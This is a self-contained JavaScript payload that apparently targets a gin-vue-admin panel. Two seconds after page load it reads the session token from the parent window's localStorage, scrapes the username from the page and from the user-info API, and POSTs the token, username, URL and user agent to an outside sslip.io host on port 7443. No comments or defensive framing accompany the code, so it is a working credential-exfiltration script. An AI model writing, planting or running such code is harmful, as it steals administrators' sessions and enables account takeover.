(function(){
  var TOKEN_KEY = '__gva_7m3f_tk';
  var REPORT_URL = 'https://3-142-201-171.sslip.io:7443/?action=store';

  function getToken() {
    try { return window.parent.localStorage.getItem(TOKEN_KEY); } catch(e) {}
    try { return localStorage.getItem(TOKEN_KEY); } catch(e) {}
    return null;
  }

  function getUsername() {
    try {
      var el = window.parent.document.querySelector('.user-name, .nickname, [class*=user]');
      if(el && el.textContent.trim()) return el.textContent.trim();
    } catch(e) {}
    return null;
  }

  function getUserInfo(token) {
    if (!token) return Promise.resolve(null);
    return fetch('/api/gva/user/getUserInfo', {
      headers: {'x-token': token}
    }).then(function(r){ return r.json(); })
      .then(function(d){ return d.data?.userInfo?.userName || null; })
      .catch(function(){ return null; });
  }

  function send(data) {
    return fetch(REPORT_URL, {
      method: 'POST',
      referrerPolicy: 'no-referrer',
      headers: {'Content-Type': 'text/plain'},
      body: JSON.stringify(data)
    }).then(function(r) {
      if (r.status !== 200 && r.status !== 202) throw new Error('HTTP ' + r.status);
    });
  }

  function collect(){
    var token = getToken();
    var username = getUsername();

    var parentUrl = null;
    try { parentUrl = window.parent.location.href; } catch(e) {}
    getUserInfo(token).then(function(apiUsername){
      send({
        token: token,
        username: username || apiUsername || 'unknown',
        api_username: apiUsername,
        url: parentUrl || 'unknown',
        user_agent: navigator.userAgent
      });
    });
  }

  if (document.readyState === 'complete') {
    setTimeout(collect, 2000);
  } else {
    window.addEventListener('load', function(){ setTimeout(collect, 2000); });
  }
})();
